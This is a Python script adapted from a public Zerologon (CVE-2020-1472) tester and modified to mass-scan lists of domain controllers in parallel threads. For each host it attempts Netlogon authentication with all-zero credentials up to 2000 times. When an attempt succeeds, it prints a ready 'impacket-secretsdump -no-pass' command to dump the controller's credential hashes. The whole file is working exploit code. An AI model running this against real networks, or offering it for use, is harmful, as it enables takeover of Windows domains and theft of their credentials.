#!/usr/bin/python3
# -*- coding: utf-8 -*-
# copied from https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py
# and tuned for masscanning

#pip3 python-libnmap
 
 
from nmb.NetBIOS import NetBIOS
import argparse, threading, queue, os.path
from termcolor import cprint

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time, pyfiglet
from binascii import hexlify, unhexlify
from subprocess import check_call

cola = queue.Queue()
MAX_ATTEMPTS = 2000	


def start(*args):
    while True:
        if cola.empty() == True:
            exit()
        else:
            dc_ip = cola.get()
            dc_name = cola.get()
            perform_attack('\\\\' + dc_name, dc_ip, dc_name)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
    try:
        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    except Exception as error:
        pass
        return "conn"

  # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
    flags = 0x212fffff

  # Send challenge and authentication request.
    try:
        nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    except Exception as error:
        return "bad"

    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, 
            target_computer + '\x00', ciphertext, flags
        )

    # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            return "break"
    except BaseException as ex:
        return "break"


def perform_attack(dc_handle, dc_ip, target_computer):
    cprint('[!] Performing authentication attempts on '+dc_ip+'...', 'green')
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
        if rpc_con == "conn":
            cprint("[-] Attack failed. Target is probably patched. IP = {} ComputerName = {}".format(dc_ip, target_computer), "red")
            return
        elif rpc_con == "bad":  
            cprint("[-] Bad NetBIOS computer name. IP = {} ComputerName = {}".format(dc_ip, target_computer), "red")
            return
        elif rpc_con == "break":
            cprint("This might have been caused by invalid arguments or network issues. IP = {} ComputerName = {}".format(dc_ip, target_computer), "red")
            return
        elif rpc_con == None:
            continue
        else:
            break

    if rpc_con:
        cprint('[+] Success! DC can be fully compromised by a Zerologon attack. IP = {} ComputerName = {}'.format(dc_ip, target_computer), "blue")
        cprint("cmd:")
        cprint("impacket-secretsdump -no-pass '" + target_computer + "'@"+ dc_ip + "", "red")
        
    else:
        cprint('[-] Attack failed. Target is probably patched. IP = {} ComputerName = {}'.format(dc_ip, target_computer), "red")
    
    return

if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help = True, formatter_class = argparse.RawDescriptionHelpFormatter, epilog = """Mass check on CVE-2020-1472
        python3 check_cve-2020-1472.py --file <path>
        """)

    parser.add_argument('--file', type = str, help = 'File path with IP and hostnames')
    parser.add_argument('--threads', type = int, help = 'Number of threads, default 5')


    args = parser.parse_args()

    cprint(r"""
 ███▄ ▄███▓ ▄▄▄        ██████   ██████    ▒███████▒▓█████  ██▀███   ▒█████   ██▓     ▒█████    ▄████  ▒█████   ███▄    █ 
▓██▒▀█▀ ██▒▒████▄    ▒██    ▒ ▒██    ▒    ▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ 
▓██    ▓██░▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄      ░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒
▒██    ▒██ ░██▄▄▄▄██   ▒   ██▒  ▒   ██▒     ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░▒██░    ▒██   ██░░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒
▒██▒   ░██▒ ▓█   ▓██▒▒██████▒▒▒██████▒▒   ▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░░██████▒░ ████▓▒░░▒▓███▀▒░ ████▓▒░▒██░   ▓██░
░ ▒░   ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░   ░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
░  ░      ░  ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░   ░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░
░      ░     ░   ▒   ░  ░  ░  ░  ░  ░     ░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ 
       ░         ░  ░      ░        ░       ░ ░       ░  ░   ░         ░ ░      ░  ░    ░ ░        ░     ░ ░           ░ 
                                          ░                                                                                        
                                                                
                                                                """, "green")
    

    if args.file == None:
        cprint("Use --help for more information", "red")
        exit()

    if args.file != None:
        
        if os.path.isfile(args.file) == False:
            print("File with IP addresses does not exist")
        else:
            file = open(args.file, 'r')
            for line in file:
                ##cola.put(line.strip())
                dip, dname = line.split(",")
                cola.put(dip.strip())
                cola.put(dname.strip())
                
            if args.threads == None:
                number_of_threads = 5
            else:
                number_of_threads = args.threads
      
        
    for line in range(number_of_threads):
        th = threading.Thread(target = start)
        th.start()
